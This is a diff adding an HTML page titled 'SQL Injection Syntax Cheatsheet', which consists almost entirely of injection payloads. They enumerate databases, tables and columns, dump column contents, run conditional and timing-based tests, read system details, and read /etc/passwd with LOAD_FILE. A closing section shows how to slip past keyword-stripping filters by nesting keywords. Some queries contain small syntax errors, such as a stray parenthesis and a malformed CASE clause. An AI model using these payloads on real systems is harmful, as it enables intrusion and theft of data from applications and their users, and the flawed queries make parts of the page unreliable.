@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <link href="sql.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css?family=Playfair+Display&display=swap" rel="stylesheet">
+    <title></title>
+  </head>
+  <body>
+    <center>
+    <h1>SQL Injection Syntax Cheatsheet</h1>
+</center><br><br><br><br>
+
+
+<div class="code"><hr>
+
+  <h2>Leak all of the database names as a string</h2>
+  <p>SELECT GROUP_CONCAT( SCHEMA_NAME ) FROM INFORMATION_SCHEMA.SCHEMATA<p>
+  <h2>Leak all of the tables in one database as a string</h2>
+  <p>SELECT GROUP_CONCAT( TABLE_NAME ) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA="{DATABASE_NAME}"
+  </p>
+  <h4>TO DO THIS FOR SQLite:<h4>
+    <p>SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table')</p>
+    <hr>
+
+
+
+  <h2>Leak the column names of a table as a string</h2>
+  <p>SELECT GROUP_CONCAT( COLUMN_NAME ) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME="{TABLE NAME}"
+  </p>
+  <h4>TO LEAK THE WHOLE SCHEMA OF A TABLE IN SQLITE:</h4>
+  <p>SELECT GROUP_CONCAT(sql) FROM sqlite_master WHERE type='table')
+  </p>
+  <br><hr>
+
+
+  <h2>Leak the ONE column from a table</h2>
+  <p>SELECT GROUP_CONCAT( "{COLUMN_NAME}" ) FROM "{TABLE NAME}"</p>
+  <h4>IF THIS DOES NOT WORK, TRY WITHOUT THE QUOTES!!</h4>
+  <br><hr>
+
+
+  <h2>In-line Conditions (an if statement)</h2>
+  <p>SELECT "value" CASE WHEN condition>0 THEN 'return this' ELSE 'return instead' END</p>
+  <em>This may be best used with timing attacks, like `SLEEP(1)` as the else condition action. Other option might be:</em>
+  <p>SELECT ( IF ( 1=1, "Condition successful!", "Condition errored!" ) )</p>
+  <br><hr>
+
+
+  <h2>Get the path of the running MySQL instance</h2>
+  <p>SELECT @@datadir</p><hr>
+
+
+  <h2>Get the version of the running MySQL instance</h2>
+  <p>SELECT @@version</p><hr>
+
+
+
+<h2>Get current user</h2>
+<p>SELECT user();</p>
+<p>SELECT system_user();</p><hr>
+
+
+<h2>Read a file</h2>
+<p>SELECT LOAD_FILE("/etc/passwd");</p>
+<br>
+<h3>Etcetera..</h3><em>
+Some applications try to replace keywords with an empty string. If this is the case, try and trick it by placing the keyword inside of itself. This is devious!
+</em>
+<p>
+frfromom => from
+oorr => or
+loaload_filed_file => load_file
+selselectect => select
+</p><hr>
+<br><br>
+<div class="footer">
+  <p>Made by 👻 </p>
+</div>
+
+  </body>
+</html>
